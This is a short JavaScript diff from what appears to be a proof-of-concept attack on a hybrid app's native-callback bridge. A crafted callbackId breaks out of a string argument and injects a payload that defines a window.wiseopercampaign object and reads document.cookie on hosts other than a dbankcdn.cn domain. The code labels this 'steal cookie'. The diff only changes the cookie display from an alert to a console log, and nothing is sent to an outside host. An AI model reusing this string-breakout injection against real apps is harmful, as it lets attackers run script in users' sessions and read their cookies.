@@ -23,7 +23,7 @@
         });
         // const callbackId = `${service}${genCallbackId()}`;
         const currUrl = location.href;
-        const payload = `if (typeof window.wiseopercampaign === 'undefined') {window.wiseopercampaign = window.wiseopercampaign || {callbackFromNative: function() {console.log('cloudx hahaha')},};};if(!location.href.startsWith("https://h5hosting-drcn.dbankcdn.cn")&&!window.__cloudx_called){window.__cloudx_called=true;alert('cloudx steal cookie : '+document.cookie);}`;
+        const payload = `if (typeof window.wiseopercampaign === 'undefined') {window.wiseopercampaign = window.wiseopercampaign || {callbackFromNative: function() {console.log('cloudx hahaha')},};};if(!location.href.startsWith("https://h5hosting-drcn.dbankcdn.cn")&&!window.__cloudx_called){window.__cloudx_called=true;console.log('cloudx steal cookie : '+document.cookie);}`;
         const callbackId = `${service}${genCallbackId()}');window.addEventListener("error", function(event) {console.error("全局捕获错误：", event.error.message);}); ${payload}//`;
 
         if (success || fail) callbackCache[callbackId] = {success, fail};
